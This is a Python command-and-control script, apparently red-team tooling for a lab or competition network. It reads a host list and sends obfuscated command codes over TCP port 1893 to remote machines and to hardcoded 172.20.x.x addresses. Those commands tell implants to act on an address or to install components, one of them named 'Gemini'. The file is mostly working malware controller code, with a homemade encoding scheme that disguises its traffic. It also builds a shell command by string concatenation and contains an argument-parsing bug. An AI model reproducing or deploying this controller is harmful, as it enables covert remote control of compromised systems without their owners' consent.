#!/usr/bin/env python3
import os
import sys
import subprocess
import random
import socket
def getFileCont(file):
    command = "cat " + file
    fileCont = str(subprocess.check_output(command, shell=True))
    return fileCont[2:(len(fileCont)-1)]
hosts = []
hostList = getFileCont("/etc/manticore/hosts.list")
hosts = hostList.split("\n")
def main():
    arguments = []
    for arg in sys.argv:
        arguments.append(arg)
    del(arguments[0])
    for argument in arguments:
        if (argument.lower == "-b"):
            address = arguments[1]
            message = encrypt("C17", address)
            for host in hosts:
                try:
                    sock = socket.create_connection((host, 1893), timeout=5)
                    sock.send(message.encode('utf-8'))
                except Exception as e:
                    message = str(e)
                    print("An error occured when trying to contact " + host + ": " + message)
            del(arguments[0])
            del(arguments[0])
        if (argument.lower() == "-i"):
            mainHosts = ["172.20.240.20", "172.20.242.10", "172.20.241.30", "172.20.241.40"]
            for host in mainHosts:
                message = encrypt("S99", host)
                try:
                    sock = socket.create_connection((host, 1893), timeout=5)
                    sock.send(message.encode('utf-8'))
                except Exception as e:
                    message = str(e)
                    print("An error occured when trying to install on " + host + ": " + message)
            del(arguments[0])
        if (argument.lower() == "-fi"):
            host = arguments[1]
            message = encrypt("S99", host)
            try:
                sock = socket.create_connection((host, 1893), timeout=5)
                sock.send(message.encode('utf-8'))
            except Exception as e:
                message = str(e)
                print("An error occured when trying to install on " + host + ": " + message)
            del(arguments[0])
            del(arguments[0])
        if (argument.lower() == "-gi"):
            message = encrypt("G99", "0.0.0.0")
            mainHosts = ["172.20.240.20", "172.20.242.10", "172.20.241.30", "172.20.241.40"]
            for host in mainHosts:
                try:
                    sock = socket.create_connection((host, 1893), timeout=5)
                    sock.send(message.encode('utf-8'))
                except Exception as e:
                    message = str(e)
                    print("An error occured when trying to install Gemini on " + host + ": " + message)
def encrypt(code, address):
    message = []
    firstNum = random.randint(1,9)
    secondNum = random.randint(10,99)
    character = code[:1]
    num = int(code[1:])
    charNum = ord(character)
    key = "" + str(firstNum) + str(secondNum)
    message.append(hex(int(key)))
    operator = firstNum * secondNum
    charNum = charNum + operator
    num = num + operator
    message.append(hex(charNum))
    message.append(hex(num))
    addr = address.split(".")
    x = 0
    for thing in addr:
        addr[x] = hex(int(thing) + operator)
        x = x + 1
    y = '?'
    addrCode = y.join(addr)
    message.append(addrCode)
    y = '-'
    return y.join(message)
def decrypt(message):
    decoded = []
    messArray = message.split('-')
    messArray[0] = int(messArray[0],0)
    messArray[1] = int(messArray[1],0)
    messArray[2] = int(messArray[2],0)
    key = str(messArray[0])
    keyOne = key[:1]
    keyTwo = key[1:]
    decoded.append(keyOne+keyTwo)
    operator = int(keyOne) * int(keyTwo)
    codeLet = messArray[1]
    codeNum = messArray[2]
    codeLet = chr(codeLet-operator)
    codeNum = codeNum - operator
    code = str(codeLet) + str(codeNum)
    decoded.append(code)
    address = messArray[3]
    addrArray = address.split("?")
    x = 0
    for num in addrArray:
        addrArray[x] = str(int(addrArray[x],0) - operator)
        x = x + 1
    y = '.'
    address = y.join(addrArray)
    decoded.append(address)
    y = '-'
    return y.join(decoded)
main ()